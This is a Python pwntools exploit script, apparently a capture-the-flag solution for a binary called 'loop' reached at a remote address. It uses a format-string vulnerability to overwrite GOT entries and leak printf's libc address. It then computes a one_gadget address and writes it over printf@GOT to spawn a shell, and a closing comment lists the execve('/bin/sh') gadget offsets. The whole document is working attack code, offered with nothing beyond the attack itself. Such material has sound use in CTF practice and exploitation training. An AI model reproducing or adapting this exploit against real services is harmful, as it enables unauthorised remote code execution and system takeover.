from pwn import *
#p=process('./loop')
p=remote('103.229.41.18',5556)
elf = ELF('./loop')
#libc = ELF('libc.so.6')
libc = ELF('libc6_2.23-0ubuntu11.3_amd64.so')
#raw_input("DEBUG")
context.clear(arch = 'amd64')
puts_got = 0x601018
func03 = 0x400805
#12
payload = fmtstr_payload(12, {puts_got: func03})
p.sendlineafter("name? ",payload)

payload = "+%13$s++"
payload += p64(elf.symbols['got.printf'])
p.sendlineafter("name? ",payload)
p.recvuntil("+")
printf = u64(p.recv(6)+"\x00"*2)
log.info("printf: "+hex(printf))

base = printf - libc.symbols['printf']
log.info("Base: "+hex(base))

one = base + 0xf03a4
log.info("One: "+hex(one))

one_low = one & 0xffff
log.info("one_low: "+hex(one_low))
one_mid = one >> 16 & 0xffff
log.info("one_mid: "+hex(one_mid))
one_high = one >> 32 & 0xffff
log.info("one_high: "+hex(one_high))
printf_got = 0x601028
got = 0x601020
payload = "%"+str(one_low)+"c%17$hn"
payload += "%"+str(one_mid+0x10000-one_low)+"c%18$hn"
payload += "%"+str(one_high+0x10000-one_mid)+"c%19$hn"
payload = payload.ljust(40,"a")
payload += p64(printf_got)
payload += p64(printf_got+2)
payload += p64(printf_got+4)
p.sendlineafter("name? ",payload)



p.interactive()
'''
 b*0x00000000004007a9
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''